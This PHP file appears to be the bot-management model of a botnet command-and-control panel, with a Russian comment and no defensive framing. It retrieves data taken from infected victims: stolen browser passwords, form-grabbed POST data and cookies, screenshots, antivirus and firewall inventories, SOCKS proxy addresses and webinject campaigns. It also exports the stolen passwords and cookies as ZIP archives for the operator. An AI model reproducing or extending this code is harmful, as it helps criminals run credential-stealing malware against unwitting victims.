<?php

require_once 'application/models/accessory_models/PaginationWorker.php';

class Model_Bot extends Model
{
    public function get_data() { }

    public function getBotInfo()
    {
        $bot_info = $this->getDB()->queryRow('SELECT * FROM bots WHERE id=:bot_id', array(':bot_id' => $this->request_data['bot_id']));
        if (!empty($bot_info))
        {
            return $bot_info;
        }
        return NULL;
    }

    public function getNetViewInfo()
    {
        $netViewInfo = $this->getDB()->queryRow(
            'SELECT * FROM reports_netview_info WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));

        if (empty($netViewInfo))
        {
            return NULL;
        }

        $netViewInfo['clients'] = $this->getDB()->queryRows(
            'SELECT * FROM reports_netview_info_clients WHERE reports_netview_info_id=:reports_netview_info_id',
            array(':reports_netview_info_id' => $netViewInfo['id']));
        return $netViewInfo;
    }

    public function getSoftwareInfo()
    {
        $softwareInfo = array();
        $softwareInfo['antiviruses'] = $this->getDB()->queryRows(
            'SELECT * FROM reports_antivirus WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));
        $softwareInfo['software'] = $this->getDB()->queryRows(
            'SELECT * FROM reports_software WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));
        $softwareInfo['firewalls'] = $this->getDB()->queryRows(
            'SELECT * FROM reports_firewall WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));
        if (empty($softwareInfo['antiviruses']) && empty($softwareInfo['software']) && empty($softwareInfo['firewalls']))
        {
            return NULL;
        }
        return $softwareInfo;
    }

    public function getReportsInfo()
    {
        $accountsCount = $this->getDB()->queryValue('SELECT COUNT(id) FROM stealer_passwords WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));
        $httpGrabberDataCount = $this->getDB()->queryValue('SELECT COUNT(id) FROM reports_http_grabber WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));
        $screenShotsCount = $this->getDB()->queryValue('SELECT COUNT(id) FROM reports_screenshots WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));
        $injectsCampaignsCount = $this->getDB()->queryValue('SELECT COUNT(id) FROM webinjects_campaigns WHERE botids LIKE :botid_pattern',
            array(':botid_pattern' => '%' . $this->request_data['bot_id'] . '%'));
        return array(
            'passwords_count' => number_format($accountsCount),
            'http_grabber_data_count' => number_format($httpGrabberDataCount),
            'screenshots_count' => number_format($screenShotsCount),
            'injects_campaigns_count' => number_format($injectsCampaignsCount)
        );
    }

    public function sortPasswords()
    {
        // подтягиваем воркер для работы с данными из браузеров
        include 'application/models/accessory_models/BrowserDataWorker.php';
        $browserWorker = new BrowserDataWorker();
        return $browserWorker->sortPasswords($this->request_data, $this->getBotIdByRowId($this->request_data['bot_id']));
    }

    public function savePasswordsToZip()
    {
        $zipSaver = new ZipSaver();
        $zipSaver->newZip()->setBotid($this->getBotIdByRowId($this->request_data['bot_id']))->setBotRowId($this->request_data['bot_id'])->downloadPasswords()->sendZip();
    }

    public function saveCookiesToZip()
    {
        $zipSaver = new ZipSaver();
        $zipSaver->newZip()->setBotid($this->getBotIdByRowId($this->request_data['bot_id']))->setBotRowId($this->request_data['bot_id'])->downloadCookies()->sendZip();
    }

    public function saveReportsToZip()
    {
        $zipSaver = new ZipSaver();
        $zipSaver->newZip()->setBotid($this->getBotIdByRowId($this->request_data['bot_id']))->setBotRowId($this->request_data['bot_id'])->downloadPasswords()->downloadCookies()->sendZip();
    }

    public function getSocks()
    {
        $socksData = RDBClient::DB()->queryRow('SELECT backserver_ip, botport FROM backclients WHERE botid=:bot_id', array(':bot_id' => $this->getBotIdByRowId($this->request_data['bot_id'])));
        if ($socksData)
            return $socksData['backserver_ip'] . ':' . $socksData['botport'];
        return 'None';
    }

    public function getScreenshots()
    {
        if (empty($this->request_data['bot_id']))
        {
            return NULL;
        }

        $screenShots = $this->getDB()->queryRows('SELECT bot_id,path,description FROM reports_screenshots WHERE bot_id=:bot_id', array(':bot_id' => $this->request_data['bot_id']));
        return $screenShots;
    }

    public function getScreenshotsData()
    {
        if (empty($this->request_data['bot_id']) || empty($this->request_data['pageSize']) || empty($this->request_data['pageNumber']))
        {
            return NULL;
        }

        $paginationWorker = new PaginationWorker($this->request_data['pageSize'], $this->request_data['pageNumber']);

        $screenShots = $this->getDB()->queryRows(
            'SELECT path,description FROM reports_screenshots WHERE bot_id=:bot_id' . $paginationWorker->getLimit(),
            array(':bot_id' => $this->request_data['bot_id']));

        $totalCount = $this->getDB()->queryValue(
            'SELECT COUNT(id) FROM reports_screenshots WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));

        $responseData = $paginationWorker->getJsonEncodedData($totalCount, $screenShots, static function($dataRow) {
            return '
                <div class="alert alert-default">
                <div class="row">
                    <div class="col-sm-4">
                        <a href="'.$dataRow['path'].'" target="_blank" class="screenshots-image-link">
                            <img src="'.$dataRow['path'].'" alt="Image not found" class="screenshots-image"/>
                        </a>
                    </div>
                    <div class="col-sm-8">
                        <span>'.htmlspecialchars($dataRow['description']).'</span>
                    </div>
                </div>
            </div>
            ';
        });

        return $responseData;
    }

    public function getScreenshotsDataTest()
    {
        if (empty($this->request_data['bot_id']) || empty($this->request_data['pageSize']) || empty($this->request_data['pageNumber']))
        {
            return NULL;
        }

        $paginationWorker = new PaginationWorker($this->request_data['pageSize'], $this->request_data['pageNumber']);

        $screenShots = $this->getDB()->queryRows(
            'SELECT path,description FROM reports_screenshots WHERE bot_id=:bot_id' . $paginationWorker->getLimit(),
            array(':bot_id' => $this->request_data['bot_id']));

        $totalCount = $this->getDB()->queryValue(
            'SELECT COUNT(id) FROM reports_screenshots WHERE bot_id=:bot_id',
            array(':bot_id' => $this->request_data['bot_id']));

        $responseData = $paginationWorker->getJsonEncodedData($totalCount, $screenShots, static function($dataRow) {
            return array(
                '<li>
                    <figure>
                        <img src="/' . $dataRow['path'] . '" alt="img01"/>
                        <figcaption>
                            <p>'. htmlspecialchars($dataRow['description']) .'</p>
                        </figcaption>
                    </figure>
                </li>',
                '<li>
                    <figure>
                        <figcaption>
                            <p>'. htmlspecialchars($dataRow['description']) .'</p>
                        </figcaption>
                        <img src="/' . $dataRow['path'] . '" alt="img01"/>
                    </figure>
                </li>');
        });

        return $responseData;
    }

    public function getPasswordsData()
    {
        if (empty($this->request_data['bot_id']) || empty($this->request_data['pageSize']) || empty($this->request_data['pageNumber']))
        {
            return NULL;
        }

        $paginationWorker = new PaginationWorker($this->request_data['pageSize'], $this->request_data['pageNumber']);

        $generalFilter = base64_decode($this->request_data['filter']);

        $filters = json_decode(base64_decode($this->request_data['additional_filters']), true);

        if (!empty($generalFilter))
        {
            $paginationWorker->setFilter(
                '
                AND (service LIKE :filter OR
                login LIKE :filter OR
                browser LIKE :filter OR
                password LIKE :filter)
            ', array(':filter' => $generalFilter));
        } else
        {
            $paginationWorker->setAdditionalFilter($filters);
        }

        $passwordsDataSource = $this->getDB()->queryRows(
            'SELECT
                      id,service,login,password,browser
                    FROM
                      stealer_passwords
                    WHERE
                      bot_id=:bot_id'
            .$paginationWorker->getFilterText().
            $paginationWorker->getLimit(),
            array(':bot_id' => $this->request_data['bot_id']) + $paginationWorker->getFilterValues()
        );

        $totalCount = $this->getDB()->queryValue(
            'SELECT
                      COUNT(id)
                    FROM
                      stealer_passwords
                    WHERE
                      bot_id=:bot_id'
            .$paginationWorker->getFilterText(),
            array(':bot_id' => $this->request_data['bot_id']) + $paginationWorker->getFilterValues());

        $responseData = $paginationWorker->getJsonEncodedData($totalCount, $passwordsDataSource, static function($dataRow) {
            return '
                <tr>
                    <td>'.htmlspecialchars($dataRow['service']).'</td>
                    <td>'.htmlspecialchars($dataRow['login']).'</td>
                    <td>'.htmlspecialchars($dataRow['password']).'</td>
                    <td>'.htmlspecialchars($dataRow['browser']).'</td>
                </tr>
            ';
        });

        return $responseData;
    }

    public function getGrabberData()
    {
        if (empty($this->request_data['bot_id']) || empty($this->request_data['pageSize']) || empty($this->request_data['pageNumber']))
        {
            return NULL;
        }

        $paginationWorker = new PaginationWorker($this->request_data['pageSize'], $this->request_data['pageNumber']);

        $generalFilter = base64_decode($this->request_data['filter']);

        $filters = json_decode(base64_decode($this->request_data['additional_filters']), true);

        if (!empty($generalFilter))
        {
            $paginationWorker->setFilter(
                ' 
                    AND (url LIKE :filter OR
                    post_data LIKE :filter OR
                    cookie LIKE :filter)
                ', array(':filter' => $generalFilter));
        } else
        {
            $paginationWorker->setAdditionalFilter($filters);
        }

        $grabberData = $this->getDB()->queryRows(
            'SELECT
                      id,url,post_data,insert_date
                    FROM
                      reports_http_grabber
                    WHERE
                      bot_id=:bot_id'
            .$paginationWorker->getFilterText().
            $paginationWorker->getLimit(),
            array(':bot_id' => $this->request_data['bot_id']) + $paginationWorker->getFilterValues());

        $totalCount = $this->getDB()->queryValue(
            'SELECT
                      COUNT(id)
                    FROM
                      reports_http_grabber
                    WHERE
                      bot_id=:bot_id'.$paginationWorker->getFilterText(),
            array(':bot_id' => $this->request_data['bot_id']) + $paginationWorker->getFilterValues());

        $responseData = $paginationWorker->getJsonEncodedData($totalCount, $grabberData, function($dataRow) {
            return '
                <div data-http-grabber-row-id="'.$dataRow['id'].'">
                    <span class="bot-forms-url">'.htmlspecialchars($this->cutString($dataRow['url'], 0, 100)).'</span>
                    <div class="alert alert-default bot-forms-post-data">
                        <div>'.htmlspecialchars($this->cutString($dataRow['post_data'], 0, 260)).'</div>
                        <a class="bot-forms-post-data-more" onclick="getFormsDataById('.$dataRow['id'].')" data-toggle="modal" data-target="#bot-tab-forms-show-more-info">Show more...</a>
                    </div>
                    <div class="bot-forms-date">
                        <span>'.htmlspecialchars($dataRow['insert_date']).'</span>
                    </div>
                </div>
            ';
        });

        return $responseData;
    }

    private function cutString($string, $start = 0, $width = 120, $trim_marker = '...')
    {
        $len = strlen(trim($string));
        $new_string = (($len > $width) && ($len !== 0)) ? rtrim(mb_strimwidth($string, $start, $width - strlen($trim_marker))) . $trim_marker : $string;
        return $new_string;
    }

    public function getFormsData()
    {
        if (empty($this->request_data['form_id']))
        {
            return NULL;
        }

        $formData = $this->getDB()->queryRow('SELECT * FROM reports_http_grabber WHERE id=:id', array(':id' => $this->request_data['form_id']));

        if (empty($formData))
        {
            return NULL;
        }

        $formDataHtml = '';

        $formDataHtml .= '
            <h4>URL</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['url']).'</span>
            <br>
            <hr>
            <h4>User Agent</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['useragent']).'</span>
            <br>
            <hr>
            <h4>Content Type</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['content_type']).'</span>
            <br>
            <hr>
            <h4>Accept Encoding</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['accept_encoding']).'</span>
            <br>
            <hr>
            <h4>Accept Language</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['accept_language']).'</span>
            <br>
            <hr>
            <h4>Referer</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['referer']).'</span>
            <br>
            <hr>
            <h4>Cookie</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['cookie']).'</span>
            <br>
            <hr>
            <h4>Post Data</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['post_data']).'</span>
            <br>
            <hr>
            <h4>Flags</h4>
            '.htmlspecialchars($formData['flags']).'
            <br>
            <hr>
            <h4>Date</h4>
            <span class="bot-forms-post-data">'.htmlspecialchars($formData['insert_date']).'</span>
            <br>
        ';

        return $formDataHtml;
    }

    public function getCampaignsList()
    {
        $campaigns = $this->getDB()->queryRows('SELECT * FROM webinjects_campaigns WHERE botids LIKE :botid_pattern', array(':botid_pattern' => '%' . $this->request_data['bot_id'] . '%'));
        return $campaigns;
    }

    public function getInjectsList()
    {
        if (empty($this->request_data['campaign_id']))
        {
            return NULL;
        }

        $campaign = $this->getDB()->queryRow('SELECT * FROM webinjects_campaigns WHERE id = :campaign_id', array(':campaign_id' => $this->request_data['campaign_id']));

        $injectsIds = array();
        if ((int)$campaign['group_id'] > 0)
        {
            $injectsIdsFromGroup = $this->getDB()->queryValues('SELECT inject_id FROM webinjects_groups_injects WHERE group_id = :group_id', $campaign['group_id']);

            foreach ($injectsIdsFromGroup as $inject) {
                $injectsIds[] = (int)$inject;
            }
        }
        $injectsIdsFromCampaigns = $this->getDB()->queryValues('SELECT inject_id FROM webinjects_campaigns_injects WHERE campaign_id = :campaign_id', array(':campaign_id' => $campaign['id']));

        foreach ($injectsIdsFromCampaigns as $inject) {
            $injectsIds[] = (int)$inject;
        }

        $injects = array();
        if (!empty($injectsIds))
        {
            $uniqueInjects = array_unique($injectsIds, SORT_NUMERIC);
            $injects = $this->getDB()->queryRows('SELECT name, description FROM webinjects_injects WHERE id IN (' . implode(',', $uniqueInjects) . ')');
        }

        $response = '';

        foreach ($injects as $inject)
        {
            $response .= '
                <tr>
                    <td>'.htmlspecialchars($inject['name']).'</td>
                    <td>'.htmlspecialchars($inject['description']).'</td>
                </tr>
            ';
        }

        return $response;

    }

}

class PasswordsData
{
    public $items;
    public $totalCount;

    public function __construct()
    {
        $this->items = array();
    }
}

class HttpGrabberData
{
    public $items;
    public $totalCount;

    public function __construct()
    {
        $this->items = array();
    }
}

class HttpGrabberDataItem
{
}